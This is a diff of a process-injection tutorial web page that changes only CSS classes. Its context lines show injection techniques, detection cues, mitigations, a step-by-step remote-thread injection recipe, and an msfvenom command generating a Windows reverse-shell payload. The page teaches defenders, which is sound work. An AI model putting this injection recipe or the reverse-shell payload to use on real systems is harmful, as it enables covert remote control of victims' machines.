@@ -47,7 +47,7 @@
                     <li><strong>Alloc ➜ Write ➜ Run </strong>(remote thread, Early-Bird APC)</li>
                     <li><strong>Image replacement </strong>(hollowing, ghosting, doppelgänging)</li>
                     <li><strong>Thread hijack </strong>(suspend-patch-resume, APC queue)</li>
-                    <li><strong>Hook/Callback abuse </strong>(<code class="bg-[#334155] text-blue-300 rounded px-1">SetWindowsHookEx</code>, Ldr callbacks)</li>
+                    <li><strong>Hook/Callback abuse </strong>(<code class="break-all bg-[#334155] text-blue-300 rounded px-1">SetWindowsHookEx</code>, Ldr callbacks)</li>
                     <li><strong>Reflective mapping </strong>(manual DLL map, sRDI)</li>
                     </ul>
                 </article>
@@ -55,7 +55,7 @@
                     <div>
                     <h3 class="mb-1 font-semibold text-teal-300">Detect:</h3>
                     <ul class="list-disc pl-5 space-y-0.5">
-                        <li>❗ <code class="bg-[#334155] text-blue-300 rounded px-1">RWX</code> page flips</li>
+                        <li>❗ <code class="break-all bg-[#334155] text-blue-300 rounded px-1">RWX</code> page flips</li>
                         <li>⚠️ remote thread in unknown region</li>
                         <li>🔍 Sysmon 8/10/11 spikes</li>
                     </ul>
@@ -65,7 +65,7 @@
                     <ul class="list-disc pl-5 space-y-0.5">
                         <li>🛡️ HVCI / KMCI</li>
                         <li>🔐 WDAC / AppLocker</li>
-                        <li>🚫 Block <code class="bg-[#334155] text-blue-300 rounded px-1">PROCESS_VM_WRITE</code></li>
+                        <li>🚫 Block <code class="break-all bg-[#334155] text-blue-300 rounded px-1">PROCESS_VM_WRITE</code></li>
                     </ul>
                     </div>
                 </div>
@@ -154,19 +154,19 @@
                         <ol class="space-y-4 text-sm">
                             <li class="flex items-start gap-3">
                             <span class="mt-1 h-2 w-2 flex-none rounded-full bg-teal-300"></span>
-                            <span><b>Handle access</b><br> <code class="bg-[#334155] text-blue-300 rounded px-1">PROCESS_VM_WRITE</code>/<code class="bg-[#334155] text-blue-300 rounded px-1">PROCESS_CREATE_THREAD</code></span>
+                            <span><b>Handle access</b><br> <code class="break-all bg-[#334155] text-blue-300 rounded px-1">PROCESS_VM_WRITE</code>/<code class="break-all bg-[#334155] text-blue-300 rounded px-1">PROCESS_CREATE_THREAD</code></span>
                             </li>
                             <li class="flex items-start gap-3">
                             <span class="mt-1 h-2 w-2 flex-none rounded-full bg-teal-300"></span>
-                            <span><b>Allocate memory</b><br>Uses OS APIs <code class="bg-[#334155] text-blue-300 rounded px-1">VirtualAllocEx()</code> to allocate memory inside the target process.</span>
+                            <span><b>Allocate memory</b><br>Uses OS APIs <code class="break-all bg-[#334155] text-blue-300 rounded px-1">VirtualAllocEx()</code> to allocate memory inside the target process.</span>
                             </li>
                             <li class="flex items-start gap-3">
                             <span class="mt-1 h-2 w-2 flex-none rounded-full bg-teal-300"></span>
-                            <span><b>Write payload</b><br>Copies malicious code (DLL or shellcode) into that memory <code class="bg-[#334155] text-blue-300 rounded px-1">WriteProcessMemory</code></span>
+                            <span><b>Write payload</b><br>Copies malicious code (DLL or shellcode) into that memory <code class="break-all bg-[#334155] text-blue-300 rounded px-1">WriteProcessMemory</code></span>
                             </li>
                             <li class="flex items-start gap-3">
                             <span class="mt-1 h-2 w-2 flex-none rounded-full bg-teal-300"></span>
-                            <span><b>Trigger execution</b><br>Forces the target process to run the payload via <code class="bg-[#334155] text-blue-300 rounded px-1">CreateRemoteThread()</code>.</span>
+                            <span><b>Trigger execution</b><br>Forces the target process to run the payload via <code class="break-all bg-[#334155] text-blue-300 rounded px-1">CreateRemoteThread()</code>.</span>
                             </li>
                         </ol>
                     </article>
@@ -188,7 +188,7 @@
                     <span class="mt-1 inline-flex h-6 w-6 flex-none items-center justify-center rounded-full bg-rose-400/25 ring-1 ring-rose-400/30">🛡️</span>
                     <p class="leading-relaxed">
                     <strong class="mb-4 text-lg font-semibold text-teal-300">Defense Evasion:</strong><br>
-                    AV/EDR sensors apply lighter scrutiny to permitted binaries; malware that “lives off the land” inside <code class="bg-[#334155] text-blue-300 rounded px-1">explorer.exe</code>, <code class="bg-[#334155] text-blue-300 rounded px-1">lsass.exe</code>, or a signed vendor agent blends into normal 
+                    AV/EDR sensors apply lighter scrutiny to permitted binaries; malware that “lives off the land” inside <code class="break-all bg-[#334155] text-blue-300 rounded px-1">explorer.exe</code>, <code class="break-all bg-[#334155] text-blue-300 rounded px-1">lsass.exe</code>, or a signed vendor agent blends into normal 
                     telemetry and inherits that binary’s allow-lists and exclusions.
                     </p>
                 </li>
@@ -225,11 +225,11 @@
                 Prioritise these high-signal clues to catch injections before they escalate.
             </p>
             </header>
-            <section class="grid gap-10 sm:grid-cols-3">
+            <section class="grid gap-10 sm:grid-cols-3 grid-cols-1">
                 <article class="group relative rounded-xl border border-cyan-400/10 bg-[#0b2434] p-6 transition hover:border-cyan-400/30">
                     <h3 class="mb-2 flex items-center gap-2 font-semibold text-cyan-300">Abnormal Handles</h3>
                     <p class="text-sm leading-relaxed text-slate-200">
-                        Alert on <code class="bg-[#334155] text-blue-300 rounded px-1">OpenProcess(PROCESS_VM_WRITE | PROCESS_CREATE_THREAD…)</code> where caller ≠ target parent, or when a <strong>Medium-integrity</strong> process opens a <strong>High-integrity target</strong>
+                        Alert on <code class="break-all bg-[#334155] text-blue-300 rounded px-1">OpenProcess(PROCESS_VM_WRITE | PROCESS_CREATE_THREAD…)</code> where caller ≠ target parent, or when a <strong>Medium-integrity</strong> process opens a <strong>High-integrity target</strong>
                         or from <strong>Normal User</strong> to <strong>SYSTEM</strong>.
                     </p>
                     <span
@@ -238,7 +238,7 @@
                 <article class="group relative rounded-xl border border-cyan-400/10 bg-[#0b2434] p-6 transition hover:border-cyan-400/30">
                     <h3 class="mb-2 flex items-center gap-2 font-semibold text-cyan-300">Suspicious memory patterns</h3>
                     <p class="text-sm leading-relaxed text-slate-200">
-                    Watch for fresh <code class="bg-[#334155] text-blue-300 rounded px-1">RWX</code>/<code class="bg-[#334155] text-blue-300 rounded px-1">RX</code> regions, or rapid <code class="bg-[#334155] text-blue-300 rounded px-1">RW→RX</code>
+                    Watch for fresh <code class="break-all bg-[#334155] text-blue-300 rounded px-1">RWX</code>/<code class="break-all bg-[#334155] text-blue-300 rounded px-1">RX</code> regions, or rapid <code class="break-all bg-[#334155] text-blue-300 rounded px-1">RW→RX</code>
                     flips with high entropy and no PE header.
                     </p>
                     <span
@@ -247,7 +247,7 @@
                 <article class="group relative rounded-xl border border-cyan-400/10 bg-[#0b2434] p-6 transition hover:border-cyan-400/30">
                     <h3 class="mb-2 flex items-center gap-2 font-semibold text-cyan-300">API Monitoring</h3>
                     <p class="text-sm leading-relaxed text-slate-200">
-                    Watch for suspicious calls such as: <code class="bg-[#334155] text-blue-300 rounded px-1">VirtualAllocEx/WriteProcessMemory/CreateRemoteThread</code>.
+                    Watch for suspicious calls such as: <code class="break-all bg-[#334155] text-blue-300 rounded px-1">VirtualAllocEx/WriteProcessMemory/CreateRemoteThread</code>.
                     </p>
                     <span
                     class="pointer-events-none absolute -inset-[1px] rounded-xl opacity-0 transition group-hover:opacity-100 ring-1 ring-cyan-400/30"></span>
@@ -255,7 +255,7 @@
                 <article class="group relative rounded-xl border border-cyan-400/10 bg-[#0b2434] p-6 transition hover:border-cyan-400/30">
                     <h3 class="mb-2 flex items-center gap-2 font-semibold text-cyan-300">Process Relationships</h3>
                     <p class="text-sm leading-relaxed text-slate-200">
-                        Baseline normal process behavior and flag deviations like <code class="bg-[#334155] text-blue-300 rounded px-1">msiexec.exe</code> and spawning <code class="bg-[#334155] text-blue-300 rounded px-1">cmd.exe</code> is not normal.
+                        Baseline normal process behavior and flag deviations like <code class="break-all bg-[#334155] text-blue-300 rounded px-1">msiexec.exe</code> and spawning <code class="break-all bg-[#334155] text-blue-300 rounded px-1">cmd.exe</code> is not normal.
                     </p>
                     <span
                     class="pointer-events-none absolute -inset-[1px] rounded-xl opacity-0 transition group-hover:opacity-100 ring-1 ring-cyan-400/30"></span>
@@ -282,61 +282,61 @@
             </h2>
             <p class="mt-4 text-sm text-slate-400">Layered controls that raise the cost of in-memory attacks.</p>
             </header>
-            <section class="grid gap-10 sm:grid-cols-3">
-            <article class="group relative rounded-xl border border-emerald-400/10 bg-[#0f222f] p-6 transition hover:border-emerald-400/30">
-                <h3 class="mb-2 flex items-center gap-2 font-semibold text-emerald-300">
-                🔒 Least-Privilege Handles:
-                </h3>
-                <p class="text-sm leading-relaxed text-slate-200">
-                    Run applications and users with minimal permissions with no admin rights.
-                </p>
-                <span class="pointer-events-none absolute -inset-[1px] rounded-xl opacity-0 transition group-hover:opacity-100 ring-1 ring-emerald-400/30"></span>
-            </article>
-            <article class="group relative rounded-xl border border-emerald-400/10 bg-[#0f222f] p-6 transition hover:border-emerald-400/30">
-                <h3 class="mb-2 flex items-center gap-2 font-semibold text-emerald-300">
-                🧬 OS Hardening:
-                </h3>
-                <p class="text-sm leading-relaxed text-slate-200">
-                    Disable unnecessary COM/DLL components via Attack Surface Reduction rules.
-                </p>
-                <span class="pointer-events-none absolute -inset-[1px] rounded-xl opacity-0 transition group-hover:opacity-100 ring-1 ring-emerald-400/30"></span>
-            </article>
-            <article class="group relative rounded-xl border border-emerald-400/10 bg-[#0f222f] p-6 transition hover:border-emerald-400/30">
-                <h3 class="mb-2 flex items-center gap-2 font-semibold text-emerald-300">
-                🛠️ Behavioral Monitoring:
-                </h3>
-                <p class="text-sm leading-relaxed text-slate-200">
-                    Deploy EDR solutions that analyze process behavior in real-time.
-                </p>
-                <span class="pointer-events-none absolute -inset-[1px] rounded-xl opacity-0 transition group-hover:opacity-100 ring-1 ring-emerald-400/30"></span>
-            </article>
-            <article class="group relative rounded-xl border border-emerald-400/10 bg-[#0f222f] p-6 transition hover:border-emerald-400/30">
-                <h3 class="mb-2 flex items-center gap-2 font-semibold text-emerald-300">
-                📜 Application Whitelisting:
-                </h3>
-                <p class="text-sm leading-relaxed text-slate-200">
-                    Enforce WDAC or AppLocker to restrict which binaries can start or load DLLs; and only allow trusted executables.
-                </p>
-                <span class="pointer-events-none absolute -inset-[1px] rounded-xl opacity-0 transition group-hover:opacity-100 ring-1 ring-emerald-400/30"></span>
-            </article>
-            <article class="group relative rounded-xl border border-emerald-400/10 bg-[#0f222f] p-6 transition hover:border-emerald-400/30">
-                <h3 class="mb-2 flex items-center gap-2 font-semibold text-emerald-300">
-                🚨 Network Segmentation:
-                </h3>
-                <p class="text-sm leading-relaxed text-slate-200">
-                    Isolate critical systems; restrict lateral movement paths.
-                </p>
-                <span class="pointer-events-none absolute -inset-[1px] rounded-xl opacity-0 transition group-hover:opacity-100 ring-1 ring-emerald-400/30"></span>
-            </article>
-            <article class="group relative rounded-xl border border-emerald-400/10 bg-[#0f222f] p-6 transition hover:border-emerald-400/30">
-                <h3 class="mb-2 flex items-center gap-2 font-semibold text-emerald-300">
-                🏗️ Patch Management:
-                </h3>
-                <p class="text-sm leading-relaxed text-slate-200">
-                    Keep operating systems and software updated to fix vulnerabilities exploited for injection.
-                </p>
-                <span class="pointer-events-none absolute -inset-[1px] rounded-xl opacity-0 transition group-hover:opacity-100 ring-1 ring-emerald-400/30"></span>
-            </article>
+            <section class="grid gap-10 sm:grid-cols-3 grid-cols-1">
+                <article class="group relative rounded-xl border border-emerald-400/10 bg-[#0f222f] p-6 transition hover:border-emerald-400/30">
+                    <h3 class="mb-2 flex items-center gap-2 font-semibold text-emerald-300">
+                    🔒 Least-Privilege Handles:
+                    </h3>
+                    <p class="text-sm leading-relaxed text-slate-200">
+                        Run applications and users with minimal permissions with no admin rights.
+                    </p>
+                    <span class="pointer-events-none absolute -inset-[1px] rounded-xl opacity-0 transition group-hover:opacity-100 ring-1 ring-emerald-400/30"></span>
+                </article>
+                <article class="group relative rounded-xl border border-emerald-400/10 bg-[#0f222f] p-6 transition hover:border-emerald-400/30">
+                    <h3 class="mb-2 flex items-center gap-2 font-semibold text-emerald-300">
+                    🧬 OS Hardening:
+                    </h3>
+                    <p class="text-sm leading-relaxed text-slate-200">
+                        Disable unnecessary COM/DLL components via Attack Surface Reduction rules.
+                    </p>
+                    <span class="pointer-events-none absolute -inset-[1px] rounded-xl opacity-0 transition group-hover:opacity-100 ring-1 ring-emerald-400/30"></span>
+                </article>
+                <article class="group relative rounded-xl border border-emerald-400/10 bg-[#0f222f] p-6 transition hover:border-emerald-400/30">
+                    <h3 class="mb-2 flex items-center gap-2 font-semibold text-emerald-300">
+                    🛠️ Behavioral Monitoring:
+                    </h3>
+                    <p class="text-sm leading-relaxed text-slate-200">
+                        Deploy EDR solutions that analyze process behavior in real-time.
+                    </p>
+                    <span class="pointer-events-none absolute -inset-[1px] rounded-xl opacity-0 transition group-hover:opacity-100 ring-1 ring-emerald-400/30"></span>
+                </article>
+                <article class="group relative rounded-xl border border-emerald-400/10 bg-[#0f222f] p-6 transition hover:border-emerald-400/30">
+                    <h3 class="mb-2 flex items-center gap-2 font-semibold text-emerald-300">
+                    📜 Application Whitelisting:
+                    </h3>
+                    <p class="text-sm leading-relaxed text-slate-200">
+                        Enforce WDAC or AppLocker to restrict which binaries can start or load DLLs; and only allow trusted executables.
+                    </p>
+                    <span class="pointer-events-none absolute -inset-[1px] rounded-xl opacity-0 transition group-hover:opacity-100 ring-1 ring-emerald-400/30"></span>
+                </article>
+                <article class="group relative rounded-xl border border-emerald-400/10 bg-[#0f222f] p-6 transition hover:border-emerald-400/30">
+                    <h3 class="mb-2 flex items-center gap-2 font-semibold text-emerald-300">
+                    🚨 Network Segmentation:
+                    </h3>
+                    <p class="text-sm leading-relaxed text-slate-200">
+                        Isolate critical systems; restrict lateral movement paths.
+                    </p>
+                    <span class="pointer-events-none absolute -inset-[1px] rounded-xl opacity-0 transition group-hover:opacity-100 ring-1 ring-emerald-400/30"></span>
+                </article>
+                <article class="group relative rounded-xl border border-emerald-400/10 bg-[#0f222f] p-6 transition hover:border-emerald-400/30">
+                    <h3 class="mb-2 flex items-center gap-2 font-semibold text-emerald-300">
+                    🏗️ Patch Management:
+                    </h3>
+                    <p class="text-sm leading-relaxed text-slate-200">
+                        Keep operating systems and software updated to fix vulnerabilities exploited for injection.
+                    </p>
+                    <span class="pointer-events-none absolute -inset-[1px] rounded-xl opacity-0 transition group-hover:opacity-100 ring-1 ring-emerald-400/30"></span>
+                </article>
             </section>
             <br><br>
             <blockquote class="border-l-4 border-blue-400 pl-4 italic">
@@ -361,7 +361,7 @@
                 <tbody class="divide-y divide-purple-500/10 text-sm">
                 <tr class="hover:bg-white/5">
                     <td class="px-4 py-3 font-semibold text-violet-200">DLL Injection</td>
-                    <td class="px-4 py-3">Forces target to load a malicious DLL via <code class="bg-[#334155] text-blue-300 rounded px-1">LoadLibrary()</code></td>
+                    <td class="px-4 py-3">Forces target to load a malicious DLL via <code class="break-all bg-[#334155] text-blue-300 rounded px-1">LoadLibrary()</code></td>
                     <td class="px-4 py-3">Stealth payload execution</td>
                 </tr>
                 <tr class="hover:bg-white/5">
@@ -371,7 +371,7 @@
                 </tr>
                 <tr class="hover:bg-white/5">
                     <td class="px-4 py-3 font-semibold text-violet-200">Process Hollowing</td>
-                    <td class="px-4 py-3">Overwrites a suspended process’s memory (e.g., <code class="bg-[#334155] text-blue-300 rounded px-1">notepad.exe</code>) with malware</td>
+                    <td class="px-4 py-3">Overwrites a suspended process’s memory (e.g., <code class="break-all bg-[#334155] text-blue-300 rounded px-1">notepad.exe</code>) with malware</td>
                     <td class="px-4 py-3">Ransomware deployment</td>
                 </tr>
                 <tr class="hover:bg-white/5">
@@ -408,8 +408,8 @@
                 <span class="absolute -left-[10px] flex h-5 w-5 items-center justify-center rounded-full bg-teal-500/20 ring-2 ring-teal-400/50 text-xs font-bold text-teal-200">1</span>
                 <h3 class="text-lg font-semibold text-teal-300 mb-1">Attach to the Running Process</h3>
                 <p class="leading-relaxed text-slate-200 text-sm">
-                Call <code class="bg-[#334155] text-blue-300 rounded px-1">OpenProcess()</code> or <code class="bg-[#334155] text-blue-300 rounded px-1">NtOpenProcess</code> to get a handle to the target process
-                with <code class="bg-[#334155] text-blue-300 rounded px-1">PROCESS_VM_WRITE</code> &amp; <code class="bg-[#334155] text-blue-300 rounded px-1">PROCESS_CREATE_THREAD</code>.<br>
+                Call <code class="break-all bg-[#334155] text-blue-300 rounded px-1">OpenProcess()</code> or <code class="break-all bg-[#334155] text-blue-300 rounded px-1">NtOpenProcess</code> to get a handle to the target process
+                with <code class="break-all bg-[#334155] text-blue-300 rounded px-1">PROCESS_VM_WRITE</code> &amp; <code class="break-all bg-[#334155] text-blue-300 rounded px-1">PROCESS_CREATE_THREAD</code>.<br>
                 <strong>Why:</strong> Grants you permission to modify memory and start threads inside the targeted process.
                 </p>
             </li>
@@ -417,7 +417,7 @@
                 <span class="absolute -left-[10px] flex h-5 w-5 items-center justify-center rounded-full bg-teal-500/20 ring-2 ring-teal-400/50 text-xs font-bold text-teal-200">2</span>
                 <h3 class="text-lg font-semibold text-teal-300 mb-1">Allocate Memory</h3>
                 <p class="leading-relaxed text-slate-200 text-sm">
-                Use <code class="bg-[#334155] text-blue-300 rounded px-1">VirtualAllocEx()</code> to allocate an RW region in the targeted process.<br>
+                Use <code class="break-all bg-[#334155] text-blue-300 rounded px-1">VirtualAllocEx()</code> to allocate an RW region in the targeted process.<br>
                 <strong>Why:</strong> Provides a safe, private space to drop your payload without corrupting existing data.
                 </p>
             </li>
@@ -425,7 +425,7 @@
                 <span class="absolute -left-[10px] flex h-5 w-5 items-center justify-center rounded-full bg-teal-500/20 ring-2 ring-teal-400/50 text-xs font-bold text-teal-200">3</span>
                 <h3 class="text-lg font-semibold text-teal-300 mb-1">Write the Payload</h3>
                 <p class="leading-relaxed text-slate-200 text-sm">
-                Call <code class="bg-[#334155] text-blue-300 rounded px-1">WriteProcessMemory()</code> to copy your shellcode or reflective stub into the allocated pages.<br>
+                Call <code class="break-all bg-[#334155] text-blue-300 rounded px-1">WriteProcessMemory()</code> to copy your shellcode or reflective stub into the allocated pages.<br>
                 <strong>Why:</strong> Places the executable instructions inside the target’s address space.
                 </p>
             </li>
@@ -433,7 +433,7 @@
                 <span class="absolute -left-[10px] flex h-5 w-5 items-center justify-center rounded-full bg-teal-500/20 ring-2 ring-teal-400/50 text-xs font-bold text-teal-200">4</span>
                 <h3 class="text-lg font-semibold text-teal-300 mb-1">Change to Execute</h3>
                 <p class="leading-relaxed text-slate-200 text-sm">
-                Invoke <code class="bg-[#334155] text-blue-300 rounded px-1">VirtualProtectEx()</code> to switch pages to <code class="bg-[#334155] text-blue-300 rounded px-1">PAGE_EXECUTE_READ</code>.<br>
+                Invoke <code class="break-all bg-[#334155] text-blue-300 rounded px-1">VirtualProtectEx()</code> to switch pages to <code class="break-all bg-[#334155] text-blue-300 rounded px-1">PAGE_EXECUTE_READ</code>.<br>
                 <strong>Why:</strong> Tthe CPU will run your code.
                 </p>
             </li>
@@ -441,7 +441,7 @@
                 <span class="absolute -left-[10px] flex h-5 w-5 items-center justify-center rounded-full bg-teal-500/20 ring-2 ring-teal-400/50 text-xs font-bold text-teal-200">5</span>
                 <h3 class="text-lg font-semibold text-teal-300 mb-1">Trigger Execution</h3>
                 <p class="leading-relaxed text-slate-200 text-sm">
-                Call <code class="bg-[#334155] text-blue-300 rounded px-1">CreateRemoteThread()</code>, or an APC Injection, or thread hijack to hand control to your code.<br>
+                Call <code class="break-all bg-[#334155] text-blue-300 rounded px-1">CreateRemoteThread()</code>, or an APC Injection, or thread hijack to hand control to your code.<br>
                 <strong>Why:</strong> Launches the payload inside the process, inheriting its trust and privileges.
                 </p>
             </li>
@@ -462,7 +462,7 @@
                 <div class="mt-4 relative ">
                     <button class="absolute top-2 right-2 bg-indigo-500 text-white px-3 py-1 rounded text-sm" onclick="copyCode(this)">Copy</button>
                     <pre class="mt-8 overflow-x-auto bg-gray-900 p-4 rounded-lg shadow-inner ">
-                    <code class="language-csharp text-green-300  ">
+                    <code class="break-all language-csharp text-green-300  ">
 // Project Name: Process Injection - Hardcoded shellcode
 // By: Iron Hulk
 
@@ -608,7 +608,7 @@ class Encrypt
                     <div class="mt-4 relative ">
                         <button class="absolute top-2 right-2 bg-indigo-500 text-white px-3 py-1 rounded text-sm" onclick="copyCode(this)">Copy</button>
                         <pre class="mt-8 overflow-x-auto bg-gray-900 p-4 rounded-lg shadow-inner ">
-                            <code class="language-csharp text-green-300  ">
+                            <code class="break-all language-csharp text-green-300  ">
 // Project Name: Process Injection - Encryption
 // msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=443 EXITFUNC=thread -f raw -o injection.bin
 // This will create a new file: injection.enc
@@ -708,7 +708,7 @@ public static class Encryptor
                     <div class="mt-4 relative ">
                         <button class="absolute top-2 right-2 bg-indigo-500 text-white px-3 py-1 rounded text-sm" onclick="copyCode(this)">Copy</button>
                         <pre class="mt-8 overflow-x-auto bg-gray-900 p-4 rounded-lg shadow-inner ">
-                        <code class="language-csharp text-green-300  ">
+                        <code class="break-all language-csharp text-green-300  ">
 // Project Name: Process Injection - Download -> Decryption -> Inject -> Run
 // By: Iron Hulk
 
